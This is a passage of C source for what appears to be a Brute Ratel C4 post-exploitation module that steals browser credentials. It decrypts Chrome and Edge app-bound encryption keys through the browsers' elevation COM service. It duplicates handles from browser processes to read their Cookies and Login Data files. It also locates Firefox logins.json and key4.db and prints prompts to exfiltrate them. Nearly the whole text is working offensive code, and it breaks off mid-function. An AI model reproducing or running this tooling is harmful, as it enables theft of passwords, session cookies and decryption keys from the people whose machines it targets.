#include "definitions.h"
#include "badger_exports.h"

// ================= START OF DEFINITIONS =================

#define SystemHandleInformation 0x10
#define HANDLE_TYPE_FILE 37
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004

//nanodump fileless download
#define CALLBACK_FILE       0x02
#define CALLBACK_FILE_WRITE 0x08
#define CALLBACK_FILE_CLOSE 0x09
// chunk size used in download_file: 900 KiB
#define CHUNK_SIZE 0xe1000

#define SystemHandleInformationEx 64 // this may differ based on win version

typedef struct _SYSTEM_HANDLE {
	ULONG ProcessId;
	UCHAR ObjectTypeNumber;
	UCHAR Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, SYSTEM_HANDLE_INFORMATION_, * PSYSTEM_HANDLE_INFORMATION_;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    HANDLE UniqueProcessId;
    HANDLE HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;


typedef struct __PACKET_HEADER {
    DWORD magic;
    DWORD type;
    CHAR buffer[256];
    DWORD dwSize;
} PACKET_HEADER;

enum PacketType {
    PACKET_DATA = 1,
    PACKET_FILE = 2,
    PACKET_CMD = 4
};

// https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824
const CLSID Chrome_CLSID_Elevator = { 0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B} };
const IID Chrome_IID_IElevator    = { 0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8} };
const CLSID Edge_CLSID_Elevator   = { 0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67} };
const IID Edge_IID_IElevator      = { 0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B} };

typedef enum {
    PROTECTION_NONE = 0,
    PROTECTION_PATH_VALIDATION_OLD = 1,
    PROTECTION_PATH_VALIDATION = 2,
    PROTECTION_MAX = 3
} ProtectionLevel;

// oleview used to extract structures
// note how edge required 3 additional functions in the structure

typedef struct IElevatorEdge IElevatorEdge;

typedef struct IElevatorEdgeVtbl {
    
    HRESULT ( STDMETHODCALLTYPE *QueryInterface )( 
        IElevatorEdge * This,
        /* [in] */ REFIID riid,
        /* [annotation][iid_is][out] */ 
        _COM_Outptr_  void **ppvObject);
    
    ULONG ( STDMETHODCALLTYPE *AddRef )( 
        IElevatorEdge * This);
    
    ULONG ( STDMETHODCALLTYPE *Release )( 
        IElevatorEdge * This);

    HRESULT ( STDMETHODCALLTYPE *ReservedFunction1 )( 
        IElevatorEdge * This);
    
    HRESULT ( STDMETHODCALLTYPE *LaunchUpdateCmdElevated )( 
        IElevatorEdge * This,
        /* [in] */ LPWSTR browser_appid, 
        /* [in] */ LPWSTR cmd_id, 
        /* [in] */ unsigned long caller_proc_id, 
        /* [out] */ ULONG_PTR* proc_handle);

    HRESULT ( STDMETHODCALLTYPE *LaunchUpdateCmdElevatedAndWait )( 
        IElevatorEdge * This,
        /* [in] */ LPWSTR browser_appid, 
        /* [in] */ LPWSTR cmd_id, 
        /* [in] */ unsigned long wait_timeout, 
        /* [out] */ unsigned long* exit_code);

    HRESULT ( STDMETHODCALLTYPE *RunRecoveryCRXElevated )( 
        IElevatorEdge * This,
        /* [string][in] */ WCHAR *crx_path,
        /* [string][in] */ WCHAR *browser_appid,
        /* [string][in] */ WCHAR *browser_version,
        /* [string][in] */ WCHAR *session_id,
        /* [in] */ unsigned long caller_proc_id,
        /* [out] */ ULONG_PTR *proc_handle);
    
    HRESULT ( STDMETHODCALLTYPE *EncryptData )( 
        IElevatorEdge * This,
        /* [in] */ ProtectionLevel protection_level,
        /* [in] */  BSTR plaintext,
        /* [out] */ BSTR *ciphertext,
        /* [out] */ unsigned long *last_error);
    
    HRESULT ( STDMETHODCALLTYPE *DecryptData )( 
        IElevatorEdge * This,
        /* [in] */  BSTR ciphertext,
        /* [out] */ BSTR *plaintext,
        /* [out] */ unsigned long *last_error);
    
    HRESULT ( STDMETHODCALLTYPE *InstallVPNServices )(IElevatorEdge * This);
    
} IElevatorEdgeVtbl;

struct IElevatorEdge
{
    struct IElevatorEdgeVtbl *lpVtbl;
};

typedef struct IElevatorChrome IElevatorChrome;

typedef struct IElevatorChromeVtbl {
        
    HRESULT ( STDMETHODCALLTYPE *QueryInterface )( 
        IElevatorChrome * This,
        /* [in] */ REFIID riid,
        /* [annotation][iid_is][out] */ 
        _COM_Outptr_  void **ppvObject);
    
    ULONG ( STDMETHODCALLTYPE *AddRef )( 
        IElevatorChrome * This);
    
    ULONG ( STDMETHODCALLTYPE *Release )( 
        IElevatorChrome * This);

    HRESULT ( STDMETHODCALLTYPE *RunRecoveryCRXElevated )( 
        IElevatorChrome * This,
        /* [string][in] */ WCHAR *crx_path,
        /* [string][in] */ WCHAR *browser_appid,
        /* [string][in] */ WCHAR *browser_version,
        /* [string][in] */ WCHAR *session_id,
        /* [in] */ unsigned long caller_proc_id,
        /* [out] */ ULONG_PTR *proc_handle);
    
    HRESULT ( STDMETHODCALLTYPE *EncryptData )( 
        IElevatorChrome * This,
        /* [in] */ ProtectionLevel protection_level,
        /* [in] */  BSTR plaintext,
        /* [out] */ BSTR *ciphertext,
        /* [out] */ unsigned long *last_error);
    
    HRESULT ( STDMETHODCALLTYPE *DecryptData )( 
        IElevatorChrome * This,
        /* [in] */  BSTR ciphertext,
        /* [out] */ BSTR *plaintext,
        /* [out] */ unsigned long *last_error);
    
    HRESULT ( STDMETHODCALLTYPE *InstallVPNServices )( 
        IElevatorChrome * This);
        
} IElevatorChromeVtbl;
 
struct IElevatorChrome {
    struct IElevatorChromeVtbl *lpVtbl;
};

#define intAlloc(size) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size)
#define intFree(addr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, addr)
#define DATA_FREE(d, l) \
    if (d) { \
        MSVCRT$memset(d, 0, l); \
        intFree(d); \
        d = NULL; \
    }
#define CSIDL_LOCAL_APPDATA 0x001c
#define CSIDL_APPDATA 0x001a


typedef enum {
    CHROME = 1,
    EDGE,
    SYSTEM,
    FIREFOX,
    CHROME_COOKIES_PID,
    CHROME_LOGIN_DATA_PID,
    EDGE_COOKIES_PID,
    EDGE_LOGIN_DATA_PID
} Mode;

// ================= END OF DEFINITIONS =================


//workaround for no slot for function (reduce number of Win32 APIs called) 
FARPROC Resolver(CHAR *lib, CHAR *func) {
    FARPROC ptr = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA(lib), func);
    return ptr;
}

CHAR *GetFileContent(CHAR *path) {
    CHAR fullPath[MAX_PATH];
    HANDLE hFile = NULL;
    

    //get appdata local path and append path 
    if (path[0] == '\\') {
        BadgerDispatch(g_dispatch, "[*] Appending local app data to path\n");
        CHAR appdata[MAX_PATH];
        SHELL32$SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
        SHLWAPI$PathAppendA(appdata, path);
        MSVCRT$strncpy(fullPath, appdata, MAX_PATH);
    } else {
        MSVCRT$strncpy(fullPath, path, MAX_PATH);
    }
    
    //get handle to appdata
    hFile = KERNEL32$CreateFileA(fullPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    CHAR *buffer = NULL;
    DWORD dwSize = 0;
    DWORD dwRead = 0;

    //read cookie file and return as buffer var
    dwSize = KERNEL32$GetFileSize(hFile, NULL);
    buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwSize + 1);
    KERNEL32$ReadFile(hFile, buffer, dwSize, &dwRead, NULL);

    if(dwSize != dwRead) {
        BadgerDispatch(g_dispatch, "[*] File size mismatch while reading file\n");
    }
    KERNEL32$CloseHandle(hFile);
    return buffer;
}

CHAR *ExtractKey(CHAR *buffer, CHAR * pattern) {
    //look for pattern with key
    //CHAR pattern[] = "\"encrypted_key\":\"";
    CHAR *start = MSVCRT$strstr(buffer, pattern);
    CHAR *end = NULL;
    CHAR *key = NULL;
    DWORD dwSize = 0;
    
    if(start == NULL) {
        return NULL;
    }
    //BeaconPrintf(CALLBACK_OUTPUT,"Encrpyted string start at 0x%p buffer start at 0x%p \n", start, buffer);
    
    // calc length of key
    start += BadgerStrlen(pattern);
    buffer = start;
    end = MSVCRT$strstr(buffer, "\"");

    if(end == NULL) {
        return NULL;
    }
    dwSize = (DWORD) (end - start);
    //BeaconPrintf(CALLBACK_OUTPUT,"Encrpyted data size is %d\n", dwSize);

    //extract key from file
    key = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwSize + 1);
    MSVCRT$strncpy(key, buffer, dwSize);
    return key;
}

VOID GetMasterKey(CHAR *key) {
    BYTE *byteKey = NULL;
    DWORD dwOut = 0;
    

    //calculate size of key
    CRYPT32$CryptStringToBinaryA(key, (DWORD)BadgerStrlen(key), CRYPT_STRING_BASE64, NULL, &dwOut, NULL, NULL);
    //BeaconPrintf(CALLBACK_OUTPUT,"base64 size needed is %d.\n", dwOut);

    //base64 decode key
    byteKey = (BYTE *)KERNEL32$GlobalAlloc(GPTR, dwOut);
    CRYPT32$CryptStringToBinaryA(key, (DWORD)BadgerStrlen(key), CRYPT_STRING_BASE64, byteKey, &dwOut, NULL, NULL);  
    byteKey += 5;
    
    DATA_BLOB db;
    DATA_BLOB final;
    db.pbData = byteKey;
    db.cbData = dwOut;

    //decrypt key with dpapi for current user
    BOOL result = CRYPT32$CryptUnprotectData(&db, NULL, NULL, NULL, NULL, 0, &final);
    if(!result) {
        BadgerDispatch(g_dispatch, "[-] Decrypting the key failed\n");
        return;
    }

    // return decrypted key
    CHAR *output = (CHAR*)KERNEL32$GlobalAlloc(GPTR, (final.cbData * 4) + 1);
    DWORD i = 0;
    for(i = 0; i < final.cbData; i++) {
        MSVCRT$sprintf(output, "%s\\x%02x", output, final.pbData[i]);
    }
    BadgerDispatch(g_dispatch, "[+] Decrypted Key: %s \n", output );

    // rewind to the start of the buffer
    KERNEL32$GlobalFree(byteKey - 5);
    KERNEL32$GlobalFree(output);
    KERNEL32$LocalFree(final.pbData);
}

// https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824
const uint8_t kCryptAppBoundKeyPrefix[] = { 'A', 'P', 'P', 'B' };
const char* BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
#define KEY_SIZE 32

int isBase64(char c) {
    return (c >= 'A' && c <= 'Z') ||    // Uppercase letters
           (c >= 'a' && c <= 'z') ||    // Lowercase letters
           (c >= '0' && c <= '9') ||    // Digits
           (c == '+') || (c == '/');    // '+' and '/'
}

uint8_t* Base64Decode(const char* encoded_string, size_t* out_len) {
    int in_len = (int)BadgerStrlen((char*)encoded_string);
    int i = 0, j = 0, in_ = 0;
    uint8_t char_array_4[4], char_array_3[3];
    size_t decoded_size = (size_t)(in_len * 3) / 4;
    uint8_t* decoded_data = (uint8_t*)BadgerAlloc(decoded_size);

    *out_len = 0;
    while (in_len-- && (encoded_string[in_] != '=') && isBase64(encoded_string[in_])) {
        char_array_4[i++] = (uint8_t)encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++) char_array_4[i] = (uint8_t)(MSVCRT$strchr(BASE64_CHARS, char_array_4[i]) - BASE64_CHARS);
            char_array_3[0] = (uint8_t)(char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = (uint8_t)((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = (uint8_t)((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; i < 3; i++) decoded_data[(*out_len)++] = char_array_3[i];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++) char_array_4[j] = 0;
        for (j = 0; j < 4; j++) char_array_4[j] = (uint8_t) (MSVCRT$strchr(BASE64_CHARS, char_array_4[j]) - BASE64_CHARS);
        char_array_3[0] = (uint8_t)(char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = (uint8_t)((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = (uint8_t)((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; j < i - 1; j++) decoded_data[(*out_len)++] = char_array_3[j];
    }

    //BeaconPrintf(CALLBACK_OUTPUT, "Decoded Data: %s\n", decoded_data);  
    return decoded_data;
}

char* BytesToHexString(const BYTE *byteArray, size_t size) {
    char *hexStr = (char*)MSVCRT$malloc((size * 4) + 1);
    if (!hexStr) return NULL;
    for (size_t i = 0; i < size; ++i) {
        MSVCRT$sprintf(hexStr + (i * 4), "\\x%02x", byteArray[i]);
    }
    return hexStr;
}

VOID GetAppBoundKey(CHAR * key, Mode browser, const CLSID CLSID_Elevator, const IID IID_IElevator) {
    // initialize COM
    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        BadgerDispatch(g_dispatch, "[-] CoInitializeEx failed.\n");
        return;
    }
    IElevatorChrome* chromeElevator = NULL;
    IElevatorEdge* edgeElevator = NULL;

    // Create an instance of the IElevator COM object
    if (browser == CHROME){
        hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&chromeElevator);
    }
    else if (browser == EDGE){
        hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&edgeElevator);
    }

    if (FAILED(hr)) {
        BadgerDispatch(g_dispatch, "[-] Failed to create IElevator instance.\n");
        OLE32$CoUninitialize();
        return;
    }

    // Set the security blanket on the proxy
    if (browser == CHROME) {
        hr = OLE32$CoSetProxyBlanket(
            (IUnknown *) chromeElevator,
            RPC_C_AUTHN_DEFAULT,
            RPC_C_AUTHZ_DEFAULT,
            COLE_DEFAULT_PRINCIPAL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_DYNAMIC_CLOAKING
        );
    }
    else if (browser == EDGE) {
        hr = OLE32$CoSetProxyBlanket(
            (IUnknown *) edgeElevator,
            RPC_C_AUTHN_DEFAULT,
            RPC_C_AUTHZ_DEFAULT,
            COLE_DEFAULT_PRINCIPAL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_DYNAMIC_CLOAKING
        );
    }

    if (FAILED(hr)) {
        BadgerDispatch(g_dispatch, "[-] Failed to set proxy blanket\n");
        OLE32$CoUninitialize();
        return;
    }
    
    // base64 decode
    size_t encrypted_key_len;
    uint8_t* encrypted_key_with_header = Base64Decode(key, &encrypted_key_len);
    if (MSVCRT$memcmp(encrypted_key_with_header, kCryptAppBoundKeyPrefix, sizeof(kCryptAppBoundKeyPrefix)) != 0) {
        BadgerDispatch(g_dispatch, "[-] Invalid key header\n");
        BadgerFree((PVOID*)&encrypted_key_with_header);
        OLE32$CoUninitialize();
        return;
    }
    
    //remove app bound key prefix
    uint8_t *encrypted_key = (uint8_t*)BadgerAlloc(encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
    BadgerMemcpy(encrypted_key, encrypted_key_with_header + sizeof(kCryptAppBoundKeyPrefix), encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
    encrypted_key_len -= sizeof(kCryptAppBoundKeyPrefix);
    //BeaconPrintf(CALLBACK_OUTPUT, "encrypted key length %d\n", encrypted_key_len);

    BSTR ciphertext_data = OLEAUT32$SysAllocStringByteLen((const char*)encrypted_key , (UINT)encrypted_key_len );
    
    //BeaconPrintf(CALLBACK_OUTPUT, "Base64 Decoded Encrypted Key: %s\n", BytesToHexString(ciphertext_data, encrypted_key_len));
    BSTR plaintext_data = NULL;
    DWORD last_error = ERROR_GEN_FAILURE;
    
    // call com to decrypt key
    if (browser == CHROME){
        hr = chromeElevator->lpVtbl->DecryptData(chromeElevator,ciphertext_data, &plaintext_data, &last_error);
    }
    else if (browser == EDGE){
        hr = edgeElevator->lpVtbl->DecryptData(edgeElevator,ciphertext_data, &plaintext_data, &last_error);
    }

    // return decrypted key
    if (SUCCEEDED(hr)) {
        //BeaconPrintf(CALLBACK_OUTPUT, "Decryption succeeded.\n");
        DWORD decrypted_size = OLEAUT32$SysStringByteLen(plaintext_data);
        //BeaconPrintf(CALLBACK_OUTPUT, "Decrypted Data Size: %d\n", decrypted_size);
        BadgerDispatch(g_dispatch, "[+] Decrypted App Bound Key: %s\n", BytesToHexString((const BYTE*)plaintext_data, decrypted_size));

    } else {
        BadgerDispatch(g_dispatch, "[-] App Bound Key Decryption failed. Last error: %lu\n If error 203, beacon is most likely not operating out of correct file path \n", last_error);
    }

    OLEAUT32$SysFreeString(plaintext_data);
    OLEAUT32$SysFreeString(ciphertext_data);
    
    BadgerFree((PVOID *)&encrypted_key_with_header);
    BadgerFree((PVOID *)&encrypted_key);

    if (browser == CHROME){
        hr = (HRESULT) chromeElevator->lpVtbl->Release(chromeElevator);
    }
    else if (browser == EDGE){
        hr = (HRESULT) edgeElevator->lpVtbl->Release(edgeElevator);
    }

    OLE32$CoUninitialize();
}

VOID GetEncryptionKey(Mode browser) {
    // char * browserProcess = "";
    char * localStatePath = "";
    
    IID IID_IElevator;
    CLSID CLSID_Elevator;

    if (browser == EDGE){
        // browserProcess = "msedge.exe";
        localStatePath = "\\Microsoft\\Edge\\User Data\\Local State";
        CLSID_Elevator = Edge_CLSID_Elevator;
        IID_IElevator = Edge_IID_IElevator;
    }

    else if (browser == CHROME){
        // browserProcess = "chrome.exe";
        localStatePath = "\\Google\\Chrome\\User Data\\Local State";
        CLSID_Elevator = Chrome_CLSID_Elevator;
        IID_IElevator = Chrome_IID_IElevator;
    }
    else {
        // we shouldnt reach this, but still best practice I guess
        BadgerDispatch(g_dispatch, "[-] Somehow GetEncryptionKey was called with an unsupported browser flag.\n");
        return;
    }

    // commented out for now, as it is not needed with the use of app bound encryption
    // CHAR *data = GetFileContent(localStatePath);
    // CHAR *key = NULL;

    // if(data == NULL) {
    //     BeaconPrintf(CALLBACK_ERROR,"Reading the file failed.\n");
    //     return;
    // }
    // //BeaconPrintf(CALLBACK_OUTPUT, "Got Local State File");
    // // extract CHAR pattern[] = "\"encrypted_key\":\""; from file
    // CHAR pattern[] = "\"encrypted_key\":\"";
    // key = ExtractKey(data, pattern);
    // KERNEL32$GlobalFree(data);
    // if(key == NULL) {
    //     BeaconPrintf(CALLBACK_ERROR,"getting the key failed.\n");
    //     return;
    // }
    // //BeaconPrintf(CALLBACK_OUTPUT, "Got Encrypted Key ");
    // GetMasterKey(key);

    CHAR *app_key = NULL;
    CHAR *app_data = GetFileContent(localStatePath);
    CHAR app_pattern[] =  "\"app_bound_encrypted_key\":\"";
    if(app_data == NULL) {
        BadgerDispatch(g_dispatch, "[-] Reading the local state file failed\n");
        return;
    }
    app_key = ExtractKey(app_data, app_pattern); 
    
    GetAppBoundKey(app_key, browser, CLSID_Elevator, IID_IElevator);

    KERNEL32$GlobalFree(app_data);

    return;
}

CHAR *GetFirefoxFile(CHAR *file, CHAR* profile){
    CHAR *appdata = NULL;
    CHAR *tempProfile = NULL;
    
    // create temp var to hold profile
    tempProfile = (CHAR*)KERNEL32$GlobalAlloc(GPTR, BadgerStrlen(profile) + 1);
    MSVCRT$strncpy(tempProfile, profile, BadgerStrlen(profile)+1);
    appdata = (CHAR*)KERNEL32$GlobalAlloc(GPTR, MAX_PATH + 1);

    //get appdata local path and append path to file
    SHELL32$SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);
    file = MSVCRT$strncat(tempProfile, file, BadgerStrlen(file)+1);
    SHLWAPI$PathAppendA(appdata, "\\Mozilla\\Firefox\\Profiles");
    SHLWAPI$PathAppendA(appdata, file);
    KERNEL32$GlobalFree(tempProfile);

    return appdata;
}

VOID GetFirefoxInfo() {
    CHAR appdata[MAX_PATH];
    HANDLE hFile = NULL;

    //get appdata local path and append path 
    SHELL32$SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);
    SHLWAPI$PathAppendA(appdata, "\\Mozilla\\Firefox\\profiles.ini");
    //BeaconPrintf(CALLBACK_OUTPUT,"Firefox profile info be at: %s \n", appdata );

    //get handle to appdata
    hFile = KERNEL32$CreateFileA(appdata, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        BadgerDispatch(g_dispatch, "[-] File not found at: %s \n", appdata);
        BadgerDispatch(g_dispatch, "[-] Firefox was not found on host\n");
        return;
    }
    
    CHAR *buffer = NULL;
    DWORD dwSize = 0;
    DWORD dwRead = 0;

    //read profiles.ini file and return as buffer var
    dwSize = KERNEL32$GetFileSize(hFile, NULL);
    buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwSize + 1);
    KERNEL32$ReadFile(hFile, buffer, dwSize, &dwRead, NULL);
    if(dwSize != dwRead) {
        BadgerDispatch(g_dispatch, "[-] File size mismatch while reading profiles.ini\n");
        return;
    }
    KERNEL32$CloseHandle(hFile);
    
    //look for pattern Default=Profiles/
    CHAR pattern[] = "Default=Profiles/";
    CHAR *start = MSVCRT$strstr(buffer, pattern);
    CHAR *end = NULL;
    if(start == NULL) {
        return;
    }
    
    // calc length of profile
    start += BadgerStrlen(pattern);
    buffer = start;
    end = MSVCRT$strstr(buffer, ".default-release");

    if(end == NULL) {
        return ;
    }
    dwSize = (DWORD) (end - start);
    //BeaconPrintf(CALLBACK_OUTPUT, "Profile size is %d\n", dwSize);

    //extract profile from file
    CHAR *profile = NULL;
    profile = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwSize + 1);
    MSVCRT$strncpy(profile, buffer, dwSize);

    BadgerDispatch(g_dispatch, "[*] Firefox Default Profile: %s \n", profile);

    // get path to logins.json
    CHAR *logins = NULL;
    logins = GetFirefoxFile(".default-release\\logins.json", profile);

    //check if logins.json exists
    hFile = KERNEL32$CreateFileA(logins, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        BadgerDispatch(g_dispatch, "[-] File not found at: %s \n", logins);
        return;
    }
    
    BadgerDispatch(g_dispatch, "[+] Firefox Stored Credentials file found.\n");
    BadgerDispatch(g_dispatch, "[+] Use BRC4 'download' command on '%s' to exfiltrate\n", logins);
    // download_file();

    KERNEL32$GlobalFree(buffer);
    KERNEL32$CloseHandle(hFile);  

    // get path to key4.db
    CHAR *database = NULL;
    database = GetFirefoxFile(".default-release\\key4.db", profile);

    //check if key4.db exists
    hFile = KERNEL32$CreateFileA(database, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        BadgerDispatch(g_dispatch, "[-] File not found at: %s \n", database);
        return;
    }

    BadgerDispatch(g_dispatch, "[+] Firefox key4.db file found.\n");
    BadgerDispatch(g_dispatch, "[+] Use BRC4 'download' command on '%s' to exfiltrate\n", database);
    // download_file(); 

    KERNEL32$CloseHandle(hFile);
}

BOOL download_file() {
    // BRC4 doesnt support native file exfiltration for COFFs (or at least I didnt see a way) and I didnt want to put raw base64 output into the output.
    // This function still exists and gets referenced by the original code here and there, but this function should never be reached.
    // I still left the function and important references in the code,
    // for if in the future BRC4 does allow COFFs to exfiltrate files natively.
    
    // If you read this to check what the code does I appreciate you and your work :)
    BadgerDispatch(g_dispatch, "[-] How did you end up here? This shouldn't be possible...\n");
    return FALSE;
}

BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR * folderPath) {
    
    
    SYSTEM_HANDLE_INFORMATION_EX *shi = NULL;
    DWORD dwNeeded = 0;
    DWORD dwSize = 0xffffff / 2;
    shi = (SYSTEM_HANDLE_INFORMATION_EX *)KERNEL32$GlobalAlloc(GPTR, dwSize);
    
    //utilize NtQueryStemInformation to list all handles on system
    NTSTATUS status = NTDLL$NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
    if(status == STATUS_INFO_LENGTH_MISMATCH) {
        dwSize = dwNeeded;
        shi = (SYSTEM_HANDLE_INFORMATION_EX*)KERNEL32$GlobalReAlloc(shi, dwSize, GMEM_MOVEABLE);
        if (!dwSize){
            BadgerDispatch(g_dispatch, "[-] Failed to reallocate memory for handle information.\n");
            KERNEL32$GlobalFree(shi);
            return FALSE;
        }
    }

    status = NTDLL$NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
    if(status != 0){
        BadgerDispatch(g_dispatch, "[-] NtQuerySystemInformation failed with status 0x%x.\n",status);
        KERNEL32$GlobalFree(shi);
        return FALSE;
    }

    //iterate through each handle and find our PID and a handle to a file
    for(DWORD i = 0; i < shi->NumberOfHandles; i++) {

        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle = shi->Handles[i];
        if((DWORD)(ULONG_PTR)handle.UniqueProcessId != PID) {
            continue;
        }

        POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)BadgerAlloc(0x1000);
        ULONG returnLength = 0;
        NTSTATUS ret = 0;
        
        if(handle.GrantedAccess == 0x001a019f || ( handle.HandleAttributes == 0x2 && handle.GrantedAccess != 0x0012019f)){
            continue;
        }

        HANDLE hProc = KERNEL32$OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
        if(hProc == INVALID_HANDLE_VALUE) {
            BadgerDispatch(g_dispatch, "[-] OpenProcess failed (%d)\n", KERNEL32$GetLastError());
            KERNEL32$GlobalFree(shi);
            BadgerFree((PVOID *)&objectNameInfo);
            return FALSE;
        }

        HANDLE hDuplicate = NULL;
        if(!KERNEL32$DuplicateHandle(hProc, (HANDLE)(intptr_t)handle.HandleValue, (HANDLE) -1, &hDuplicate, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
            continue;                  
        }

        //Check if the handle exists on disk, otherwise the program will hang
        DWORD fileType = KERNEL32$GetFileType(hDuplicate);
        if (fileType != FILE_TYPE_DISK) {
            continue;
        }

        ret = NTDLL$NtQueryObject(hDuplicate,ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
        if (ret != 0) {
            BadgerDispatch(g_dispatch, "[-] NtQueryObject failed\n");
            KERNEL32$GlobalFree(shi);
            BadgerFree((PVOID *)&objectNameInfo);
            return FALSE;
        }

        if (objectNameInfo->Name.Length <= 0){
            continue;
        }

        char handleName[1024];
        MSVCRT$sprintf(handleName, "%.*ws", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
        if (MSVCRT$strstr(handleName, browserFile) == NULL){
            continue;
        }

        PPUBLIC_OBJECT_TYPE_INFORMATION objectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)BadgerAlloc(0x1000);
        ret = NTDLL$NtQueryObject(hDuplicate,ObjectTypeInformation, objectTypeInfo, 0x1000, &returnLength);
        if (ret != 0) {
            BadgerDispatch(g_dispatch, "[-] NtQueryObject failed\n");
            KERNEL32$GlobalFree(shi);
            BadgerFree((PVOID *)&objectTypeInfo);
            BadgerFree((PVOID *)&objectNameInfo);
            return FALSE;
        }

        char typeNameA[64] = {0};
        KERNEL32$WideCharToMultiByte(CP_ACP, 0, objectTypeInfo->TypeName.Buffer, objectTypeInfo->TypeName.Length / sizeof(WCHAR), typeNameA, sizeof(typeNameA), NULL, NULL);
        typeNameA[objectTypeInfo->TypeName.Length / sizeof(WCHAR)] = '\0';

        if (MSVCRT$strcmp(typeNameA,"File")){
            KERNEL32$CloseHandle(hDuplicate);
            BadgerFree((PVOID *)&objectTypeInfo);
            BadgerFree((PVOID *)&objectNameInfo);
            continue;
        }

        if ((MSVCRT$strcmp(&handleName[BadgerStrlen(handleName) - 4], "Data") == 0 || MSVCRT$strcmp(&handleName[BadgerStrlen(handleName) - 7], "Cookies") == 0)){

            BadgerDispatch(g_dispatch, "[+] Handle to %s Was FOUND with PID: %lu\n", browserFile, PID);

            KERNEL32$SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
            DWORD dwFileSize = KERNEL32$GetFileSize(hDuplicate, NULL);
            BadgerDispatch(g_dispatch, "[*] File size is %d\n", dwFileSize);
            DWORD dwRead = 0;
            CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
            KERNEL32$ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);

            CHAR copyFilePath[MAX_PATH];
